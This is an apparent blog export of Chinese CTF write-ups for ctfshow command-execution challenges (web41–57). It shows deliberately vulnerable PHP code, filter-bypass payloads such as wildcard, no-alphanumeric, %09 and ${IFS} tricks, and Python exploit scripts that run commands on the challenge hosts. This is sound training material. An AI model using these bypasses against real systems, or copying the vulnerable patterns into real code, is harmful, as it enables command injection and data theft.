<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>ban了字母，走一波、<code>c=/???/????64 ????????</code>，得到base64解码拿到flag。</p>
<p>羽师傅解法：<code>payload：?c=/???/???/????2 ????.??? ---》 然后在url + /flag.php.bz2</code></p>
<h4 id="知识点：无字母数字命令执行"><a href="#知识点：无字母数字命令执行" class="headerlink" title="知识点：无字母数字命令执行"></a>知识点：无字母数字命令执行</h4><p>由于base64不是每台机器都装的，因此还有更猛一点的解法。参考P神博客：</p>
<blockquote>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
</blockquote>
<p>还有firebasky：</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
</blockquote>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p>演示一遍无字母数字的getshell</p>
<p>先贴上Y4大佬的一把梭脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://da59fd11-9b26-4f20-b6f4-f86163f58cdd.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>然后是标准的做法：</p>
<p>先自己搞一个文件上传的接口(html)：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;题目链接&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后抓包传文件：</p>
<p><img src="https://i.loli.net/2021/04/20/jfhUtXNOlmb4SBJ.png" alt="image-20210417103026086"></p>
<p>读flag：</p>
<p><img src="https://i.loli.net/2021/04/20/5PycMCkBVKLzbJD.png" alt="image-20210417103131530"></p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>看不懂看不懂看不懂，全过滤了还怎么打</p>
<p>题目思路：全过滤了，拼接处36这个数字</p>
<p>引用Y4博客：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(())------是-1</span><br><span class="line">$((~37))------是36</span><br><span class="line">所以我们只需要保证中间是-37即可，</span><br><span class="line">$((~$(())$(())))---是1</span><br><span class="line">所以</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))代表36，即可获取flag</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行41-50</title>
    <url>/2021/04/13/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C41-50/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行篇41-50"><a href="#ctfshow命令执行篇41-50" class="headerlink" title="ctfshow命令执行篇41-50"></a>ctfshow命令执行篇41-50</h1><p>ctfshow中web入门命令执行篇的一些刷题笔记</p>
<span id="more"></span>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>羽师傅的博客：</p>
<blockquote>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108569080?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108569080?spm=1001.2014.3001.5501</a></p>
</blockquote>
<p>这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p>
<p>构筑rce_or.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
<p>运行后得到txt文件</p>
<p>接下来构筑exp.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>cmd中执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python exp.py &lt;url&gt;</span><br></pre></td></tr></table></figure>
<p>分别执行：</p>
<p>system；ls</p>
<p>system；tac flag.php</p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ls;ls  <span class="comment">//查看当前目录下文件，前一个ls执行，后一个被丢弃。等同于ls;</span></span><br><span class="line">?c=tac flag.php; <span class="comment">//拿到答案</span></span><br></pre></td></tr></table></figure>
<h4 id="知识点1：Shell脚本————-dev-null-2-gt-amp-1详解"><a href="#知识点1：Shell脚本————-dev-null-2-gt-amp-1详解" class="headerlink" title="知识点1：Shell脚本———— /dev/null 2&gt;&amp;1详解"></a>知识点1：Shell脚本———— /dev/null 2&gt;&amp;1详解</h4><p>参考链接：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/tinywan/p/6025468.html">https://www.cnblogs.com/tinywan/p/6025468.html</a></p>
</blockquote>
<p><strong>可以将/dev/null看作”黑洞”. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong><br>用处:<br>禁止标准输出.  1 cat $filename &gt;/dev/null  # 文件内容丢失，而不会输出到标准输出.<br>禁止标准错误.   2&gt;/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. </p>
<p><strong>1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
<p>> 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
<p><strong>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</strong></p>
<p>那么本文标题的语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 ：接着，标准错误输出重定向 到 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
<h4 id="知识点2：命令分隔"><a href="#知识点2：命令分隔" class="headerlink" title="知识点2：命令分隔"></a>知识点2：命令分隔</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;	<span class="comment">//分号</span></span><br><span class="line">|	<span class="comment">//只执行后面那条命令</span></span><br><span class="line">||	<span class="comment">//只执行前面那条命令</span></span><br><span class="line">&amp;	<span class="comment">//两条命令都会执行</span></span><br><span class="line">&amp;&amp;	<span class="comment">//两条命令都会执行</span></span><br><span class="line">    <span class="comment">//注意&amp;符号要进行编码</span></span><br></pre></td></tr></table></figure>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><p>多过滤了;和cat，没什么大区别，tac绕一下就行</p>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php||</span><br></pre></td></tr></table></figure>
<h4 id="知识点：读文件绕过"><a href="#知识点：读文件绕过" class="headerlink" title="知识点：读文件绕过"></a>知识点：读文件绕过</h4><p>cat被ban，以下命令可用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><p>在之前的基础上，多过滤了flag</p>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>通配符绕过，tac f*</p>
<h4 id="知识点：通配符绕过"><a href="#知识点：通配符绕过" class="headerlink" title="知识点：通配符绕过"></a>知识点：通配符绕过</h4><div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td style="text-align:left">匹配任何字符串／文本，包括空字符串；<em>代表任意字符（0个或多个） ls file </em></td>
</tr>
<tr>
<td>?</td>
<td style="text-align:left">匹配任何一个字符（不在括号内时）?代表人意1个字符 ls file 0</td>
</tr>
<tr>
<td>[abcd]</td>
<td style="text-align:left">匹配abcd中任何一个字符</td>
</tr>
<tr>
<td>[a-z]</td>
<td style="text-align:left">表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</td>
</tr>
<tr>
<td>{..}</td>
<td style="text-align:left">表示生成序列。以逗号分隔，且不能有空格</td>
</tr>
<tr>
<td>[!abcd]</td>
<td style="text-align:left">或<sup><a href="#fn_abcd" id="reffn_abcd">abcd</a></sup>表示非，表示不匹配括号里面的任何一个字符</td>
</tr>
</tbody>
</table>
</div>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><h3 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h3><p>在前面的基础上加了空格过滤</p>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>绕空格，PHP环境下 %09过</p>
<h4 id="知识点：空格绕过"><a href="#知识点：空格绕过" class="headerlink" title="知识点：空格绕过"></a>知识点：空格绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&lt;    &lt;&gt; 重定向符</span><br><span class="line">%<span class="number">09</span>(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">$IFS$<span class="number">1</span></span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">&#123;cat,flag.php&#125; <span class="comment">//用逗号实现了空格功能</span></span><br><span class="line">%<span class="number">20</span></span><br></pre></td></tr></table></figure>
<h2 id="web46、47、48"><a href="#web46、47、48" class="headerlink" title="web46、47、48"></a>web46、47、48</h2><h3 id="题目：-5"><a href="#题目：-5" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-5"><a href="#解答：-5" class="headerlink" title="解答："></a>解答：</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09????.???||    &#x2F;&#x2F;复习前面的通配符;备注：%09会解析成空格，不会被正则ban</span><br></pre></td></tr></table></figure>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><h3 id="题目：-6"><a href="#题目：-6" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-6"><a href="#解答：-6" class="headerlink" title="解答："></a>解答：</h3><p>用之前的payload也行，贴一下大佬的一排payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:c&#x3D;nl%09fla\g.php||</span><br><span class="line">payload2:c&#x3D;nl%09fla\g.php%0a</span><br><span class="line">payload3:c&#x3D;nl%09fla&#39;&#39;g.php%0a</span><br><span class="line">payload4:c&#x3D;nl%09fla&quot;&quot;g.php%0a</span><br><span class="line">payload5:c&#x3D;vi%09fla\g.php%0a</span><br><span class="line">payload6:c&#x3D;tac%09fla\g.php%0a</span><br><span class="line">payload7:c&#x3D;uniq%09fla\g.php%0a</span><br><span class="line">payload8:c&#x3D;nl&lt;fla&#39;&#39;g.php||</span><br><span class="line">payload9:c&#x3D;nl%09fla\g.php%26</span><br></pre></td></tr></table></figure>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><h3 id="题目：-7"><a href="#题目：-7" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-7"><a href="#解答：-7" class="headerlink" title="解答："></a>解答：</h3><p>paylaod1:<code>?c=tac&lt;&gt;fla\g.php||</code></p>
<p>payload2:<code>c=nl&lt;fla\g.php||</code></p>
<p>注意点：&lt;&gt;和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
</search>
